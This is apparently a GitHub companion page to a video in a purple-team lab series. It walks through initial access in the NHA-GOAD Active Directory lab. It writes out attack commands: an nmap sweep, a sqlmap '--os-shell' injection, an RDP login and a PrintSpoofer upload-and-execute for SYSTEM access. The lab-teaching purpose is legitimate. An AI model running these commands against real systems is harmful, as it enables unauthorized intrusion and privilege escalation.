## **05 - Initial Access - Purple Team Cyber Range with NHA-GOAD**

This GitHub page is a companion to the fifth video in our **Purple Team Cyber Range** series, where we explore how to gain **initial access** using techniques such as **SQL injection** and other offensive tactics in the **NHA-GOAD** Active Directory lab environment. The lab is designed for attack and defense exercises, providing a realistic experience for both red and blue teams.

## 📺 **Watch the Video**

**Video Title**: _05 - Initial Access - Purple Team Cyber Range with NHA-GOAD_  
[Watch the video on YouTube](https://www.perplexity.ai/search/hello-jPst_9ZTTs.NcfMh.UjY1g#) (Placeholder for video link)

## 🛠️ **Key Takeaways**

1. **Initial Recon and Access**:
    
    - We start by performing a network scan using **Nmap** to identify open ports and services on the target machines.
    - After identifying potential vulnerabilities, we exploit them using **SQL injection** to gain initial access to the system.
    
2. **SQL Injection Exploitation**:
    
    - Learn how to use **SQLMap** to automate SQL injection attacks and gain access to the target database.
    - We also demonstrate how to escalate from SQL injection to an OS shell on the target machine.
    
3. **Command and Control (C2) Setup**:
    
    - Once initial access is gained, we set up a **Sliver C2 server** to manage the compromised machines.
    - We use reverse shells and other techniques to maintain persistent access.
    
4. **Privilege Escalation**:
    
    - After gaining initial access, we escalate privileges using tools like **SweetPotato** to obtain SYSTEM-level access.
    

## 📚 **Resources**

Here are some useful resources mentioned in the video:

- [NHA-GOAD Guide](https://docs.ludus.cloud/docs/environment-guides/goad-nha): Official documentation on setting up NHA-GOAD.
- [Elastic SIEM Guide](https://docs.ludus.cloud/docs/environment-guides/elastic): Guide on integrating Elastic Security SIEM.
- [GOAD GitHub Repository](https://github.com/Orange-Cyberdefense/GOAD): Source code and more information about GOAD from Orange Cyberdefense.

## Previous Videos:

- [Video 1: How to Deploy a Cyber Range Using Ludus: NHA-GOAD for Purple Teaming & Elastic Security SIEM](https://youtu.be/cjTzWQ_Si3U)
- [Video 2: How to Connect to Ludus GOAD with Elastic Using WireGuard](https://youtu.be/fM65Mm011bg)
- [Video 3: Testing Our Lab Against Default Sliver C2 Implants - The Lab Works!](https://youtu.be/L5DtvxOriOU)
- [Video 4: How to Install Sysmon in Active Directory Lab on Ludus](https://youtu.be/bK5Tnf92O-Y)

## 🚀 **Getting Started**

## 1. **Network Scanning**

Start by scanning the network to identify live hosts and open ports:



`nmap -p- -sC -sV 192.168.58.0/24 -Pn -oA allports.nmap`

This command performs a full port scan (`-p-`), service detection (`-sV`), and saves the results in multiple formats (`-oA`).

## 2. **SQL Injection Exploitation**

Once you've identified a vulnerable web server, use SQLMap to exploit SQL injection vulnerabilities:

`sqlmap -u "http://10.3.10.32/Students?SearchString=a&orderBy=Firstname" --os-shell --batch --threads 10`

This command attempts SQL injection on the specified URL and attempts to gain an OS shell.

## 3. **Command and Control (C2) Setup**

After gaining an OS shell, set up a reverse shell for persistent access:

`xfreerdp /v:10.2.10.32 /u:localuser /p:'password' /cert:ignore +clipboard /dynamic-resolution`

Use this command to connect remotely via RDP once credentials are obtained.

## 4. **Privilege Escalation**

To escalate privileges, upload a tool like SweetPotato or PrintSpoofer:

`upload /home/kali/payloads/PrintSpoofer.exe C:\\Windows\\Tasks\\PrintSpoofer.exe execute -o "C:\windows\Tasks\PrintSpoofer.exe -i -c C:\Windows\Tasks\backup.exe"`

This command runs the PrintSpoofer tool, allowing you to escalate privileges from a local user account to SYSTEM.

## ⚠️ **Disclaimer**

This project is intended for **educational purposes only**. The tools and techniques demonstrated should only be used in environments where you have explicit permission to perform penetration testing or security assessments. Unauthorized use of these tools may violate laws and regulations.

## 🔧 **Tools Used**

- **Ludus Platform**: A cloud-based platform for deploying cybersecurity labs.
- **NHA-GOAD**: A pre-configured Active Directory environment designed for attack and defense simulations.
- **SQLMap**: An open-source tool used for automating SQL injection attacks.
- **Sliver C2 Framework**: An open-source command-and-control framework used by attackers for post-exploitation tasks.
- **SweetPotato/PrintSpoofer**: Tools used for privilege escalation on Windows systems.

Thank you for visiting! Be sure to subscribe to [I.T Security Labs on YouTube](https://www.youtube.com/@ITSecurityLabs) for more tutorials and updates!